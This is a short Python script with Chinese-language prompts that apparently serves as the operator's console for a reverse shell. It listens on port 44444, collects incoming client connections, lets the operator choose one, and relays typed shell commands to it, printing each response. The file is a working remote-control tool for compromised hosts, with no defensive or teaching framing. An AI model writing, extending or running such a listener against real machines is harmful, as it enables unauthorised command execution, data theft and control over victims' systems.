import socket
import threading


def wait_connect(skt):
    while not quit_thread:
        if len(client_list) == 0:
            print('等待客户端上线......')
        sock, addr = skt.accept()
        print('客户端{0}已经连接'.format(addr[0]))
        lock.acquire()
        client_list.append((sock, addr))
        lock.release()


def select_client():
    global current_client
    for i in range(len(client_list)):
        print('[{0}]-> {1}'.format(i, str(client_list[i][1][0])))

    print("请选择要连接的客户端！")

    while 1:
        num = input("请输入客户端代码：")
        if int(num) >= len(client_list):
            print('请输入正确的客户端代码！')
            continue
        else:
            break

    current_client = client_list[int(num)]
    print('=' * 80)
    print(' ' * 20 + 'Client Shell from addr:', current_client[1][0])
    print('=' * 80)


def shell_ctrl(sock, addr):
    global current_client, quit_thread
    data = sock.recv(65536)
    print(data.decode('utf-8'))
    while 1:
        command = input(str(addr[0]) + ':~# ')
        if command == '!ch':
            current_client = None
            print('-----------------------* Connection has ended *--------------------------')
            select_client()

        sock.send(command.rstrip().encode('utf-8'))
        data = sock.recv(65536)
        print(data.decode())


def main():

    t = threading.Thread(target=wait_connect, args=(s, ))
    t.start()

    while not quit_thread:
        if len(client_list) > 0:
            select_client()
            shell_ctrl(current_client[0], current_client[1])


if __name__ == '__main__':

    client_list = []
    current_client = None
    quit_thread = False
    lock = threading.Lock()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 44444))
    s.listen(4444)
    main()

